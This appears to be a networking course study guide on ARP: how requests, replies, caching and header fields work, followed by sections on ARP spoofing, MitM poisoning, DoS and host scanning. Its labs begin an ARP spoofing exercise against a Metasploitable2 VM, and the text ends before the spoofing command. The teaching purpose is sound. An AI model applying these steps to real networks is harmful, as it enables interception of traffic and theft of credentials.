# 🔍 ARP — Address Resolution Protocol

### " "Networking Course — Network Layer / Data Link Layer Bridge

> **Source:** Gate Smashers — ARP (Address Resolution Protocol)

> **Lab Environment:** Parrot OS + Metasploitable2 + Own MERN/PERN Projects

---

## 📑 Table of Contents

1. [What is ARP?](#1-what-is-arp)
2. [Why ARP is Needed — The Core Problem](#2-why-arp-is-needed--the-core-problem)
3. [How ARP Works — Request and Reply](#3-how-arp-works--request-and-reply)
   - [3.1 ARP Request — Broadcast](#31-arp-request--broadcast)
   - [3.2 ARP Reply — Unicast](#32-arp-reply--unicast)
   - [3.3 The Classroom Analogy](#33-the-classroom-analogy)
4. [ARP Cache — Storing MAC Addresses](#4-arp-cache--storing-mac-addresses)
5. [Four Communication Scenarios](#5-four-communication-scenarios)
   - [5.1 Host to Host (Same Network)](#51-host-to-host-same-network)
   - [5.2 Host to Router (Default Gateway)](#52-host-to-router-default-gateway)
   - [5.3 Router to Host](#53-router-to-host)
   - [5.4 Router to Router](#54-router-to-router)
6. [ARP Packet Header — Field by Field](#6-arp-packet-header--field-by-field)
7. [ARP in IPv4 vs IPv6](#7-arp-in-ipv4-vs-ipv6)
8. [Security Vulnerabilities — Attacking ARP](#8-security-vulnerabilities--attacking-arp)
   - [8.1 ARP Spoofing / ARP Poisoning](#81-arp-spoofing--arp-poisoning)
   - [8.2 ARP Cache Poisoning — MitM Attack](#82-arp-cache-poisoning--mitm-attack)
   - [8.3 ARP-Based DoS Attack](#83-arp-based-dos-attack)
   - [8.4 ARP Scanning / Host Discovery](#84-arp-scanning--host-discovery)
9. [🧪 Practical Labs](#9--practical-labs)
   - [Lab 1 — Inspect ARP in Action (Wireshark + arp command)](#lab-1--inspect-arp-in-action-wireshark--arp-command)
   - [Lab 2 — ARP Spoofing Attack on Metasploitable2](#lab-2--arp-spoofing-attack-on-metasploitable2)
   - [Lab 3 — MitM via ARP Poisoning (intercept your own web app traffic)](#lab-3--mitm-via-arp-poisoning-intercept-your-own-web-app-traffic)
   - [Lab 4 — Craft ARP Packets with Scapy](#lab-4--craft-arp-packets-with-scapy)
   - [Lab 5 — Detect and Defend Against ARP Poisoning](#lab-5--detect-and-defend-against-arp-poisoning)
10. [Solved Examples](#10-solved-examples)
11. [Exam Cheat Sheet](#11-exam-cheat-sheet)

---

## 1. What is ARP?

```
ARP — Address Resolution Protocol

  Full name:    Address Resolution Protocol
  Abbreviation: ARP
  RFC:          RFC 826 (published 1982)
  Layer:        Network Layer (Layer 3) in OSI model
                Internet Layer in TCP/IP model
  Purpose:      RESOLVE (convert) an IP address into a MAC address

  Key definition:
    ARP maps a known LOGICAL address (IP address — 32-bit in IPv4)
    to an UNKNOWN PHYSICAL address (MAC address — 48-bit)

  In one sentence:
    "I know WHERE you are (IP), but I don't know WHO you are (MAC) —
     ARP helps me find out."
```

```
Address types ARP bridges:

  IP Address (Logical Address):
    → 32-bit (IPv4) or 128-bit (IPv6)
    → Assigned by network administrator / DHCP
    → Changes when you move to a different network
    → Used for routing across networks (Layer 3 — routers use this)
    → Example: 192.168.1.10

  MAC Address (Physical Address):
    → 48-bit, represented as 6 pairs of hex digits (AA:BB:CC:DD:EE:FF)
    → Burned into the NIC (Network Interface Card) at manufacture
    → Unique — no two NICs in the world have the same MAC (in theory)
    → Does NOT change when you move networks
    → Used for communication WITHIN a LAN (Layer 2 — switches use this)
    → NOT public — other machines on the internet don't know your MAC
    → Example: AA:BB:CC:DD:EE:FF

  The problem:
    IP = public, known, usable for addressing across the internet
    MAC = private to the local network, required for actual frame delivery
    → To send a frame on the LAN you MUST know the MAC address
    → ARP solves: "given this IP, what is the MAC?"
```

```
Where ARP sits in the protocol stack:

  OSI Model:
    Layer 3 — Network      ← ARP lives here (uses IP addresses)
    Layer 2 — Data Link    ← ARP resolves addresses FOR this layer (MAC)

  TCP/IP Model:
    Internet Layer         ← ARP lives here

  ARP is interesting because it BRIDGES Layer 2 and Layer 3:
    → It is classified as Layer 3 (uses IP addresses)
    → But its output (MAC address) is used by Layer 2 (Ethernet frames)
    → Some textbooks call it a Layer 2.5 protocol
```

---

## 2. Why ARP is Needed — The Core Problem

```
THE FUNDAMENTAL PROBLEM:

  You (Host A) want to send data to Host C on the same LAN.
  You know Host C's IP address: 192.168.1.30
  But to actually deliver the Ethernet frame to C:
    → The Ethernet frame needs C's MAC address in its destination field
    → Without C's MAC address: you cannot build the frame
    → Without the frame: you cannot send anything

  IP address alone is NOT enough to communicate on a LAN.
  You MUST have both:
    → Destination IP (for routing decisions — "which network?")
    → Destination MAC (for frame delivery — "which device ON that network?")

  ARP's job: given the IP, find the MAC.
```

```
WHY MAC ADDRESS IS NOT PUBLIC:

  MAC addresses are hardware addresses — tied to physical NICs.
  They are designed for LOCAL network communication only.
  There is NO mechanism on the internet to look up someone's MAC address.

  Reasons MAC is not public / routeable:
    → 48 bits — cannot carry enough structure for global routing
    → Flat namespace — no hierarchy (unlike IP which has network/host portions)
    → MAC addresses stop at the first router (gateway)
    → Routers replace source/destination MAC with their own at each hop
    → A device in Bangladesh cannot know the MAC of a device in the US

  So: when Host A wants to reach Host C:
    A knows C's IP (public, discoverable)
    A does NOT know C's MAC (local, private)
    → A uses ARP to discover C's MAC before sending
```

```
The two essential addresses in Ethernet communication:

  Frame on the wire:
  ┌──────────────────┬──────────────────┬──────────────┬─────────────────┐
  │  Dest MAC (48b)  │  Src MAC (48b)   │  EtherType   │  IP Packet      │
  │  C's MAC — ???   │  A's MAC — KNOWN │  0x0800(IPv4)│  [IP header+data│
  └──────────────────┴──────────────────┴──────────────┴─────────────────┘
         ↑
         ARP is used to discover this value before the frame can be built.
```

---

## 3. How ARP Works — Request and Reply

### 3.1 ARP Request — Broadcast

```
ARP REQUEST:

  When A wants to send to C but doesn't know C's MAC:
  A sends an ARP REQUEST packet.

  Destination MAC in the ARP request: FF:FF:FF:FF:FF:FF (broadcast)
  → FF:FF:FF:FF:FF:FF is the Ethernet BROADCAST address
  → Every device on the LAN receives a broadcast frame
  → This is 48 bits — 12 hex 'F' characters — all ones in binary

  ARP Request contents:
  ┌──────────────────────────────────────────────────────────────────┐
  │  "WHO HAS IP 192.168.1.30? TELL 192.168.1.10"                   │
  │                                                                   │
  │  Sender MAC:      AA:AA:AA:AA:AA:AA  (A's MAC — KNOWN)          │
  │  Sender IP:       192.168.1.10       (A's IP — KNOWN)            │
  │  Target MAC:      00:00:00:00:00:00  (C's MAC — UNKNOWN → 0s)   │
  │  Target IP:       192.168.1.30       (C's IP — KNOWN)            │
  └──────────────────────────────────────────────────────────────────┘

  Delivery:
    → A sends this frame to the switch
    → Switch sees destination MAC = FF:FF:FF:FF:FF:FF (broadcast)
    → Switch FLOODS the frame out of ALL ports (every device on LAN gets it)
    → Every device: B, C, D, E... all receive the ARP request

  Every device that receives it:
    → Checks: "Is the Target IP MY IP?"
    → B: "192.168.1.30 is not my IP" → IGNORE (discard the packet)
    → D: "192.168.1.30 is not my IP" → IGNORE
    → C: "192.168.1.30 IS my IP!" → RESPOND with ARP Reply

  KEY POINT: ARP Request is ALWAYS a BROADCAST
  → Broadcast = goes to EVERY device on the LAN segment
  → Only the device with the matching IP responds
```

---

### 3.2 ARP Reply — Unicast

```
ARP REPLY:

  When C receives the ARP request and sees its own IP in the target:
  C sends an ARP REPLY packet back to A.

  Destination MAC in the ARP reply: AA:AA:AA:AA:AA:AA (A's MAC — from request)
  → This is UNICAST — sent ONLY to A, not to everyone
  → C already knows A's MAC because A put it in the ARP request (Sender MAC field)
  → So C can reply directly to A without broadcasting

  ARP Reply contents:
  ┌──────────────────────────────────────────────────────────────────┐
  │  "192.168.1.30 IS AT CC:CC:CC:CC:CC:CC"                         │
  │                                                                   │
  │  Sender MAC:      CC:CC:CC:CC:CC:CC  (C's MAC — the answer!)    │
  │  Sender IP:       192.168.1.30       (C's IP)                   │
  │  Target MAC:      AA:AA:AA:AA:AA:AA  (A's MAC — from request)   │
  │  Target IP:       192.168.1.10       (A's IP)                   │
  └──────────────────────────────────────────────────────────────────┘

  Delivery:
    → C sends this frame DIRECTLY to A (unicast to A's MAC)
    → Switch receives it, knows which port A is on → sends ONLY to A
    → Only A receives the reply (not B, D, E...)

  A receives the reply:
    → A now knows: "192.168.1.30 has MAC CC:CC:CC:CC:CC:CC"
    → A stores this in its ARP CACHE (so it doesn't need to ask again)
    → A can now build the Ethernet frame with C's MAC and send the actual data

  KEY POINT: ARP Reply is ALWAYS UNICAST
  → Only sent to the requesting machine
  → Not broadcast to everyone
```

---

### 3.3 The Classroom Analogy

```
THE CLASSROOM ANALOGY (from the lecture):

  Situation: A teacher (Host A) is in a class of 100 students.
             Teacher wants to find a student named "Varun" (Host C).
             Teacher doesn't know which desk Varun sits at (MAC address).
             But the teacher knows Varun's roll number (IP address).

  ARP Request = BROADCAST:
    Teacher shouts to the ENTIRE CLASS:
    "Who is roll number 42? (Varun, if you're here, raise your hand!)"
    → Message goes to ALL 100 students (broadcast)
    → 99 students hear it but ignore it ("That's not my roll number")
    → Varun hears it: "That's me!" → raises his hand (will reply)

  ARP Reply = UNICAST:
    Varun WALKS DIRECTLY to the teacher and says:
    "I am roll number 42. My name is Varun. I sit at desk 7B."
    → Only the teacher receives this reply (unicast)
    → The rest of the class is not involved

  Why roll number (not name)?
    → Roll numbers are UNIQUE (just like MAC addresses are unique)
    → Names might not be unique (two students named Varun could exist)
    → MAC addresses are guaranteed unique per NIC → always exactly one reply

  Teacher now knows:
    → Roll 42 = Varun = desk 7B (IP → Name → Location)
    → ARP equivalent: IP 192.168.1.30 = Host C = MAC CC:CC:CC:CC:CC:CC
```

---

## 4. ARP Cache — Storing MAC Addresses

```
ARP CACHE (ARP TABLE):

  After A receives C's MAC address via ARP Reply:
  A stores the mapping in its ARP CACHE (also called ARP table).

  Purpose:
    → Avoid sending a new ARP Request every single time A wants to talk to C
    → ARP Requests are broadcasts — expensive (every device on LAN processes them)
    → Caching the MAC means: next time A wants C → just look it up in cache
    → Significantly reduces broadcast traffic on the network

  ARP Cache entry format:
  ┌──────────────────┬─────────────────────┬────────────────┐
  │  IP Address      │  MAC Address        │  TTL / Expiry  │
  ├──────────────────┼─────────────────────┼────────────────┤
  │  192.168.1.30    │  CC:CC:CC:CC:CC:CC  │  120 seconds   │
  │  192.168.1.1     │  GG:GG:GG:GG:GG:GG  │  300 seconds   │
  │  192.168.1.50    │  BB:BB:BB:BB:BB:BB  │  60 seconds    │
  └──────────────────┴─────────────────────┴────────────────┘

  TTL (Time To Live) for ARP Cache:
    → ARP cache entries EXPIRE after a timeout (typically 60–300 seconds)
    → Why? MAC-to-IP mappings can change (DHCP reassigns IPs, NIC replaced, etc.)
    → After expiry: the entry is deleted → next request to that IP triggers new ARP
    → Static ARP entries: can be manually set — do NOT expire (used for security)

  Two types of ARP cache entries:
    Dynamic: learned via ARP Request/Reply — expire automatically
    Static:  manually configured by admin — never expire — more secure

  View the ARP cache on your machine:
    Linux/Parrot OS: arp -n   OR   ip neigh show
    Windows:         arp -a
```

---

## 5. Four Communication Scenarios

### 5.1 Host to Host (Same Network)

```
SCENARIO: Host A (192.168.1.10) → Host C (192.168.1.30) — SAME LAN

  Both hosts are on the same subnet (e.g., 192.168.1.0/24).
  A router is NOT involved in this communication.

  Step-by-step:
    1. A has data to send to C. A knows C's IP: 192.168.1.30
    2. A checks ARP cache: does it have C's MAC? → NO (first contact)
    3. A sends ARP Request (BROADCAST):
       "Who has 192.168.1.30? Tell 192.168.1.10"
       Destination MAC: FF:FF:FF:FF:FF:FF
    4. Switch floods to all ports → every device on LAN gets it
    5. C receives it: "That's my IP!" → C sends ARP Reply (UNICAST) to A
       "192.168.1.30 is at CC:CC:CC:CC:CC:CC"
    6. A receives reply → stores in ARP cache: 192.168.1.30 → CC:CC:CC:CC:CC:CC
    7. A now builds the Ethernet frame with C's MAC and sends the actual data
    8. All future packets to C use the cached MAC → no more ARP needed (until expiry)

  Key: ARP stays within the local LAN — no router involvement.
```

---

### 5.2 Host to Router (Default Gateway)

```
SCENARIO: Host A wants to reach Host Z in a DIFFERENT network

  A: 192.168.1.10 (Network 1)
  Z: 10.0.0.50    (Network 2 — different network entirely)
  Default Gateway (Router): 192.168.1.1

  Key insight: A knows Z's IP address. But Z is on a different network.
  Packets cannot be delivered directly to Z — they must go through the ROUTER.
  The router's IP is the Default Gateway.

  Step-by-step:
    1. A wants to send to Z (10.0.0.50)
    2. A checks: is 10.0.0.50 on my local network (192.168.1.0/24)?
       → NO (different subnet) → must send via Default Gateway
    3. A checks ARP cache: does it have the GATEWAY's MAC? → NO
    4. A sends ARP Request for the GATEWAY's IP (192.168.1.1):
       "Who has 192.168.1.1? Tell 192.168.1.10"
       Destination: FF:FF:FF:FF:FF:FF (broadcast)
    5. Gateway (Router) receives it → "That's my IP!" → ARP Reply (UNICAST):
       "192.168.1.1 is at GG:GG:GG:GG:GG:GG"
    6. A stores: 192.168.1.1 → GG:GG:GG:GG:GG:GG in ARP cache
    7. A sends the packet to Z but encapsulates it in a frame addressed to the GATEWAY:
       Frame Dest MAC: GG:GG:GG:GG:GG:GG (the gateway's MAC)
       IP Dest:        10.0.0.50          (Z's actual IP — unchanged in IP header)
    8. Gateway receives the frame, strips the Layer 2 frame
    9. Gateway reads the IP header: Destination = 10.0.0.50
    10. Gateway determines Z is on Network 2 (via routing table)
    11. Gateway performs ARP on Network 2 to find Z's MAC → sends packet to Z

  KEY INSIGHT: A sends the frame to the ROUTER's MAC, but Z's IP.
  The MAC address changes at each hop (router to router).
  The IP address stays the SAME end-to-end.
  This is the fundamental difference between Layer 2 and Layer 3 addressing.

  Analogy:
    You want to send a letter to a friend in another city.
    You address the ENVELOPE to the local post office (router/gateway).
    The letter INSIDE is addressed to your friend (final destination IP).
    The post office forwards it onward using their own routing (next hop MAC).
```

---

### 5.3 Router to Host

```
SCENARIO: Router needs to deliver a packet to a local host

  This happens when:
    → A packet arrived at the router FROM another network
    → The router's routing table says: "192.168.1.30 is on my directly connected LAN"
    → But the router needs the MAC of 192.168.1.30 to deliver the frame

  Step-by-step:
    1. Router receives packet for 192.168.1.30 from the internet
    2. Router checks its routing table: 192.168.1.30 is on interface eth0 (local LAN)
    3. Router checks its ARP cache: does it have 192.168.1.30's MAC? → NO
    4. Router sends ARP Request (BROADCAST on the LAN):
       "Who has 192.168.1.30? Tell 192.168.1.1 (gateway)"
    5. Host C replies (UNICAST): "192.168.1.30 is at CC:CC:CC:CC:CC:CC"
    6. Router stores in ARP cache and delivers the packet to C

  Same mechanism — routers use ARP exactly like hosts do,
  just from the router's perspective.
```

---

### 5.4 Router to Router

```
SCENARIO: Two routers on the same link need to find each other's MACs

  This is common in WAN links where two routers are directly connected:
    Router 1: 172.16.0.1 (Gateway of Network A)
    Router 2: 172.16.0.2 (Gateway of Network B)
    They are connected via a point-to-point link (e.g., a leased line or VLAN)

  Step-by-step:
    1. Router 1 has a packet to forward toward Network B via Router 2
    2. Router 1 checks ARP cache: MAC of 172.16.0.2? → NO
    3. Router 1 sends ARP Request (BROADCAST):
       "Who has 172.16.0.2? Tell 172.16.0.1"
    4. Router 2 replies (UNICAST): "172.16.0.2 is at RR:RR:RR:RR:RR:RR"
    5. Router 1 stores in ARP cache → builds frame → forwards the packet

  Same ARP mechanism — it doesn't matter if the device is a host or router.
  ARP resolves MAC addresses for ANY device on the same LAN segment.

SUMMARY OF ALL 4 SCENARIOS:
  ┌────────────────────┬──────────────────────────────────────────────────┐
  │  Scenario          │  ARP resolves MAC of...                         │
  ├────────────────────┼──────────────────────────────────────────────────┤
  │  Host → Host       │  The destination host (same LAN)                │
  │  Host → Router     │  The default gateway (to exit the LAN)          │
  │  Router → Host     │  The destination host (router delivers locally) │
  │  Router → Router   │  The next-hop router (adjacent router)          │
  └────────────────────┴──────────────────────────────────────────────────┘
  In ALL cases: ARP Request = Broadcast, ARP Reply = Unicast
```

---

## 6. ARP Packet Header — Field by Field

```
ARP PACKET HEADER STRUCTURE (full 28-byte header for IPv4 over Ethernet):

  ┌────────────────────────────────────┬─────────────────────────────────────────┐
  │  Field                             │  Details                                │
  ├────────────────────────────────────┼─────────────────────────────────────────┤
  │  Hardware Type (HTYPE)             │  16 bits                                │
  │                                    │  What Layer 2 technology is being used? │
  │                                    │  Value 1 = Ethernet (most common)       │
  │                                    │  Value 6 = IEEE 802 (Wi-Fi)             │
  │                                    │  Value 15 = Frame Relay                 │
  ├────────────────────────────────────┼─────────────────────────────────────────┤
  │  Protocol Type (PTYPE)             │  16 bits                                │
  │                                    │  What Layer 3 protocol address to map?  │
  │                                    │  0x0800 = IPv4 (most common)            │
  │                                    │  0x86DD = IPv6                          │
  ├────────────────────────────────────┼─────────────────────────────────────────┤
  │  Hardware Address Length (HLEN)    │  8 bits                                 │
  │                                    │  Length of hardware (MAC) address       │
  │                                    │  in BYTES                               │
  │                                    │  Value 6 = Ethernet MAC (48 bits = 6B) │
  ├────────────────────────────────────┼─────────────────────────────────────────┤
  │  Protocol Address Length (PLEN)    │  8 bits                                 │
  │                                    │  Length of protocol (IP) address        │
  │                                    │  in BYTES                               │
  │                                    │  Value 4 = IPv4 (32 bits = 4 bytes)    │
  │                                    │  Value 16 = IPv6 (128 bits = 16 bytes) │
  ├────────────────────────────────────┼─────────────────────────────────────────┤
  │  Operation (OPER)                  │  16 bits                                │
  │                                    │  What type of ARP packet is this?       │
  │                                    │  Value 1 = ARP REQUEST                  │
  │                                    │  Value 2 = ARP REPLY                    │
  │                                    │  (RARP uses 3 and 4 — see notes below) │
  ├────────────────────────────────────┼─────────────────────────────────────────┤
  │  Sender Hardware Address (SHA)     │  6 bytes (48 bits) for Ethernet         │
  │                                    │  MAC address of the SENDER              │
  │                                    │  REQUEST: A's MAC (A putting its own)   │
  │                                    │  REPLY:   C's MAC (the answer!)         │
  ├────────────────────────────────────┼─────────────────────────────────────────┤
  │  Sender Protocol Address (SPA)     │  4 bytes (32 bits) for IPv4             │
  │                                    │  IP address of the SENDER               │
  │                                    │  REQUEST: A's IP                        │
  │                                    │  REPLY:   C's IP                        │
  ├────────────────────────────────────┼─────────────────────────────────────────┤
  │  Target Hardware Address (THA)     │  6 bytes (48 bits) for Ethernet         │
  │                                    │  MAC address of the TARGET              │
  │                                    │  REQUEST: 00:00:00:00:00:00             │
  │                                    │           (unknown — that's what we want│
  │                                    │           to find! fill with zeros)     │
  │                                    │           OR FF:FF:FF:FF:FF:FF for bcast│
  │                                    │  REPLY:   A's MAC (C fills this in)     │
  ├────────────────────────────────────┼─────────────────────────────────────────┤
  │  Target Protocol Address (TPA)     │  4 bytes (32 bits) for IPv4             │
  │                                    │  IP address of the TARGET               │
  │                                    │  REQUEST: C's IP (192.168.1.30)         │
  │                                    │           (the IP we are looking up)    │
  │                                    │  REPLY:   A's IP                        │
  └────────────────────────────────────┴─────────────────────────────────────────┘

  Total ARP packet size (IPv4/Ethernet): 28 bytes payload
  Plus Ethernet frame header: 14 bytes (6+6+2)
  Total on wire: 42 bytes minimum (padded to 60 bytes minimum Ethernet frame)
```

```
ARP Packet — Visual layout (standard exam diagram):

  0        8        16       24       32
  ├────────────────┬─────────────────────┤
  │  HTYPE (16)   │     PTYPE (16)       │
  ├────────────────┴──────────────────────┤
  │  HLEN (8)  │  PLEN (8)  │  OPER (16)│
  ├────────────────────────────────────────┤
  │         Sender Hardware Address        │
  │              (6 bytes)                 │
  ├────────────────────────────────────────┤
  │         Sender Protocol Address        │
  │              (4 bytes IPv4)            │
  ├────────────────────────────────────────┤
  │         Target Hardware Address        │
  │    (6 bytes — 00:00... in request)    │
  ├────────────────────────────────────────┤
  │         Target Protocol Address        │
  │              (4 bytes IPv4)            │
  └────────────────────────────────────────┘

Quick field values to memorise for GATE:
  Ethernet over IPv4:
    HTYPE = 1       (Ethernet)
    PTYPE = 0x0800  (IPv4)
    HLEN  = 6       (6 bytes = 48-bit MAC)
    PLEN  = 4       (4 bytes = 32-bit IPv4)
    OPER  = 1       (Request) or 2 (Reply)
```

---

## 7. ARP in IPv4 vs IPv6

```
ARP is an IPv4-only protocol.

  ARP (RFC 826):     Used with IPv4
  NDP (RFC 4861):    Used with IPv6 — Neighbour Discovery Protocol
                     NDP replaces ARP in IPv6 networks
                     Uses ICMPv6 messages instead of dedicated ARP packets

  In IPv6:
    ARP → replaced by NDP (Neighbour Discovery Protocol)
    ARP Request → ICMPv6 Neighbour Solicitation (NS)
    ARP Reply   → ICMPv6 Neighbour Advertisement (NA)
    ARP Cache   → Neighbour Cache

  Why did IPv6 replace ARP?
    → ARP uses Ethernet broadcasts → doesn't scale to large networks
    → NDP uses IPv6 multicast (more efficient) — only the target device
      and nearby devices receive the solicitation (not the entire LAN)
    → NDP is more secure (has provisions for SeND — Secure Neighbour Discovery)
    → NDP combines multiple functions: address resolution, router discovery,
      duplicate address detection — all in one protocol

  For this course: ARP = IPv4 (everything in the lecture and labs)
```

---

## 8. Security Vulnerabilities — Attacking ARP

> **Critical security note:** ARP has NO authentication mechanism. There is no way for a device to verify that an ARP reply came from the legitimate owner of the IP address. This fundamental design flaw (ARP was designed in 1982 for trusted networks) makes ARP one of the most commonly exploited protocols in LAN-based attacks.

### 8.1 ARP Spoofing / ARP Poisoning

```
THE CORE VULNERABILITY:

  ARP has NO authentication.
  Any device on the LAN can send an ARP Reply claiming to be ANY IP address.
  Devices accept and cache ARP replies WITHOUT verifying who sent them.
  This is called ARP SPOOFING (sending fake ARP replies) or
  ARP POISONING (poisoning the ARP cache with false mappings).

THE ATTACK — STEP BY STEP:

  Network:
    Victim A:  192.168.1.10  MAC: AA:AA:AA:AA:AA:AA
    Victim B:  192.168.1.20  MAC: BB:BB:BB:BB:BB:BB
    Attacker:  192.168.1.99  MAC: EE:EE:EE:EE:EE:EE
    Gateway:   192.168.1.1   MAC: GG:GG:GG:GG:GG:GG

  Without attack:
    A's ARP cache: 192.168.1.1 → GG:GG:GG:GG:GG:GG (gateway's real MAC)

  Attacker sends FAKE ARP Reply to A:
    "192.168.1.1 (gateway) is at EE:EE:EE:EE:EE:EE (attacker's MAC)"
    (Attacker did NOT send a request — this is a GRATUITOUS ARP REPLY)

  A updates its ARP cache:
    192.168.1.1 → EE:EE:EE:EE:EE:EE  ← NOW WRONG — points to attacker!

  Attacker simultaneously sends FAKE ARP Reply to GATEWAY:
    "192.168.1.10 (Victim A) is at EE:EE:EE:EE:EE:EE (attacker's MAC)"

  Gateway updates its ARP cache:
    192.168.1.10 → EE:EE:EE:EE:EE:EE  ← ALSO WRONG — points to attacker!

  Result:
    → A sends packets to gateway → they go to the ATTACKER instead
    → Gateway sends packets to A → they go to the ATTACKER instead
    → Attacker is in the MIDDLE — full MitM achieved
    → Attacker forwards packets to real destinations to stay undetected
    → All of A's internet traffic flows through the attacker's machine
```

---

### 8.2 ARP Cache Poisoning — MitM Attack

```
MAN-IN-THE-MIDDLE (MitM) VIA ARP POISONING:

  After poisoning both A's and the gateway's ARP caches:

  BEFORE ATTACK:
    A ──────────────────────────→ Gateway ──→ Internet
    A ←──────────────────────── Gateway ←── Internet

  AFTER ATTACK (ARP poisoning MitM):
    A ──→ ATTACKER ──→ Gateway ──→ Internet
    A ←── ATTACKER ←── Gateway ←── Internet
              ↑
              Attacker sees ALL traffic in BOTH directions

  What the attacker can do with this position:

  PASSIVE (sniffing):
    → Read all HTTP traffic (unencrypted websites, form data, cookies)
    → See DNS queries (which sites A is visiting)
    → Capture login credentials if sent over HTTP
    → See all session cookies → session hijacking

  ACTIVE (modification):
    → Modify HTTP responses (inject scripts, change content)
    → Strip HTTPS (SSL stripping attack — downgrade HTTPS to HTTP)
    → Redirect A to fake websites (combined with DNS spoofing)
    → Inject malware into software downloads

  WHY IT WORKS AGAINST YOUR WEB PROJECTS:
    If your MERN/PERN app runs on HTTP (dev mode: localhost:3000):
    → ARP poisoning MitM can capture ALL API requests
    → Attacker sees: JWT tokens, form submissions, database queries in responses
    → Attacker can modify API responses to inject malicious data
    → Login forms → credentials captured in cleartext
```

---

### 8.3 ARP-Based DoS Attack

```
ARP DENIAL OF SERVICE:

  Scenario 1 — ARP Flood:
    Attacker sends massive numbers of ARP Requests (broadcasts)
    → Every device on the LAN must process every broadcast
    → Overwhelms CPUs of devices → DoS
    → Switch flooding table becomes overwhelmed → fails open (broadcasts everything)

  Scenario 2 — ARP Cache Overflow:
    Attacker sends thousands of ARP Replies with fake MAC-IP mappings
    → Victim's ARP cache fills up → legitimate entries evicted
    → Victim cannot communicate with real devices → DoS

  Scenario 3 — Blackhole Attack:
    Attacker sends ARP Reply to A claiming ATTACKER's MAC = Gateway's IP
    Attacker does NOT forward packets → A's traffic goes to attacker → DROPPED
    → A effectively has no internet connection → DoS
    → Unlike MitM, attacker doesn't bother forwarding (simpler, more disruptive)
```

---

### 8.4 ARP Scanning / Host Discovery

```
ARP HOST DISCOVERY:

  ARP can be used passively or actively to discover LIVE HOSTS on a LAN.
  This is one of the most reliable host discovery methods because:
    → Unlike ICMP ping: firewalls often block ICMP but NOT ARP (ARP is Layer 2)
    → ARP is LOCAL — switches process it, firewalls don't inspect it
    → If a host has an IP on the subnet, it MUST respond to ARP requests

  ARP scanning sends ARP Requests for every IP in a subnet:
    "Who has 192.168.1.1? Who has 192.168.1.2? ... Who has 192.168.1.254?"
    Any IP that replies → a live host exists at that IP

  Tools:
    arp-scan    → dedicated ARP scanning tool
    nmap -PR    → nmap ARP ping scan
    netdiscover → ARP-based network discovery

  Why this matters for your web project testing:
    → ARP scan first → get live host list → then port scan only live hosts
    → Much faster than scanning all 254 IPs when only 5 hosts exist
    → Stealth: some IDS rules miss ARP scans (focused on IP-layer traffic)
```

---

## 9. 🧪 Practical Labs

### Lab 1 — Inspect ARP in Action (Wireshark + arp command)

```bash
# PURPOSE: Watch ARP requests and replies in real time on your Parrot OS machine
# No additional tools needed — uses built-in commands

# ── Part A: View your current ARP cache ──────────────────────────────────────

# Method 1: classic arp command
arp -n
# Output example:
# Address                  HWtype  HWaddress           Flags Mask
# 192.168.56.102           ether   08:00:27:XX:XX:XX   C
# 192.168.56.1             ether   0a:00:27:00:00:00   C
# 'C' flag = dynamically learned (from ARP exchange)

# Method 2: modern ip command (more detailed)
ip neigh show
# Output example:
# 192.168.56.102 dev vboxnet0 lladdr 08:00:27:XX:XX:XX REACHABLE
# 192.168.56.1   dev vboxnet0 lladdr 0a:00:27:XX:XX:XX STALE
# States: REACHABLE (recently confirmed), STALE (not confirmed lately),
#         DELAY (being re-checked), PROBE (sending ARP), FAILED (no response)

# ── Part B: Clear the ARP cache and watch it rebuild ─────────────────────────

# Delete a specific ARP entry:
sudo arp -d 192.168.56.102
# Or clear ALL dynamic entries:
sudo ip -s -s neigh flush all

# Start Wireshark to capture ARP traffic:
sudo wireshark &
# Interface: vboxnet0 (VirtualBox host-only network)
# Filter: arp

# Now ping Metasploitable2 to trigger ARP:
ping -c 1 192.168.56.102

# In Wireshark you'll see:
#   Frame 1 (ARP Request):
#     Destination: Broadcast (ff:ff:ff:ff:ff:ff)
#     Source:      Your MAC (AA:AA:AA:AA:AA:AA)
#     ARP: "Who has 192.168.56.102? Tell 192.168.56.101"
#     Operation:   1 (Request)
#     Target MAC:  00:00:00:00:00:00 (unknown)
#
#   Frame 2 (ARP Reply):
#     Destination: Your MAC (AA:AA:AA:AA:AA:AA)
#     Source:      Metasploitable2's MAC
#     ARP: "192.168.56.102 is at 08:00:27:XX:XX:XX"
#     Operation:   2 (Reply)
#     Sender MAC:  08:00:27:XX:XX:XX (the answer!)

# Expand the ARP layer in Wireshark:
# Ethernet II → header fields (HTYPE, PTYPE, HLEN, PLEN, OPER)
# Confirm HTYPE=1, PTYPE=0x0800, HLEN=6, PLEN=4

# ── Part C: Inspect specific header fields with tshark ───────────────────────

# Capture 10 ARP packets and extract all header fields:
sudo tshark -i vboxnet0 -f "arp" -c 10 \
  -T fields \
  -e arp.hw.type \
  -e arp.proto.type \
  -e arp.hw.size \
  -e arp.proto.size \
  -e arp.opcode \
  -e arp.src.hw_mac \
  -e arp.src.proto_ipv4 \
  -e arp.dst.hw_mac \
  -e arp.dst.proto_ipv4 \
  -E header=y

# Expected output for a request:
# hw.type  proto.type  hw.size  proto.size  opcode  src.mac           src.ip         dst.mac            dst.ip
# 1        0x0800      6        4           1       aa:aa:aa:aa:aa:aa 192.168.56.101 00:00:00:00:00:00  192.168.56.102

# Expected output for a reply:
# 1        0x0800      6        4           2       08:00:27:xx:xx:xx 192.168.56.102 aa:aa:aa:aa:aa:aa  192.168.56.101
```

---

### Lab 2 — ARP Spoofing Attack on Metasploitable2

```bash
# PURPOSE: Perform ARP spoofing between Parrot OS and Metasploitable2
# SCOPE: Your own lab VMs only — never on a network you don't own
# TOOLS: arpspoof (from dsniff package) OR arp-spoof alternatives

# ── Setup ─────────────────────────────────────────────────────────────────────
# Parrot OS (attacker): 192.168.56.101
# Metasploitable2 (victim): 192.168.56.102
# VirtualBox gateway: 192.168.56.1

# Install required tools:
sudo apt update && sudo apt install dsniff arpwatch -y

# Enable IP forwarding (CRITICAL — without this you'll cause a DoS, not MitM)
# IP forwarding makes Parrot forward packets it receives (as a router would)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# Verify: cat /proc/sys/net/ipv4/ip_forward → should show 1

# ── Check current ARP caches BEFORE attack ────────────────────────────────────

# On Parrot OS:
arp -n
# Note the MAC of 192.168.56.102 (Metasploitable2) — this is the REAL MAC

# On Metasploitable2 (SSH in):
# ssh msfadmin@192.168.56.102
# arp -n
# Note the MAC of 192.168.56.1 (gateway) — this is the REAL gateway MAC

# ── LAUNCH ARP SPOOFING ───────────────────────────────────────────────────────

# Terminal 1: Tell Metasploitable2 that "192.168.56.1 (gateway) is at Parrot's MAC"
